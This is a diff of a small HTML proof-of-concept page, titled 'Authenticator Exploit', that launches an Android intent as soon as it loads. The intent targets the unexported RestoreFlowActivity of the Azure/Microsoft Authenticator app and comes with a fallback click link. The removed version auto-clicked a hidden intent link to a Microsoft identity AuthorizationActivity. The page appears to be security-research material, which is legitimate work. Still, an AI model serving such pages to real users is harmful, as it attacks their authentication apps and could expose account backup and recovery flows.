@@ -1,42 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Launch Authorization</title>
+    <title>Authenticator Exploit</title>
 </head>
 <body>
-    <h1>Launching Authorization Activity...</h1>
-    <p>If nothing happens, <a href="#" id="clickHere">click here</a></p>
-
+    <h1>Executing Internal Intent...</h1>
+    
+    <!-- This tries to launch the unexported RestoreFlowActivity -->
     <script>
-        function launchIntent() {
-            // Intent URI targeting AuthorizationActivity
-            var intentUri = 'intent://com.microsoft.identity.common.internal.providers.oauth2.AuthorizationActivity#Intent;' +
-                           'package=com.microsoft.identity.common;' +
-                           'action=android.intent.action.VIEW;' +
-                           'category=android.intent.category.DEFAULT;' +
-                           'end;';
-
-            // Create and click a hidden link
-            var link = document.createElement('a');
-            link.href = intentUri;
-            link.style.display = 'none';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-
-        // Auto-trigger on page load
-        window.onload = function() {
-            setTimeout(launchIntent, 100);
-        };
-
-        // Manual trigger fallback
-        document.getElementById('clickHere').onclick = function(e) {
-            e.preventDefault();
-            launchIntent();
-        };
+        // We use JavaScript to automatically click the link as soon as the page loads
+        window.location.href = "intent:#Intent;component=com.azure.authenticator/com.azure.authenticator.ui.backup.RestoreFlowActivity;end";
     </script>
+    
+    <!-- A manual fallback link just in case JS auto-redirect is blocked -->
+    <a href="intent:#Intent;component=com.azure.authenticator/com.azure.authenticator.ui.backup.RestoreFlowActivity;end">Click here to launch RestoreFlow</a>
 </body>
 </html>
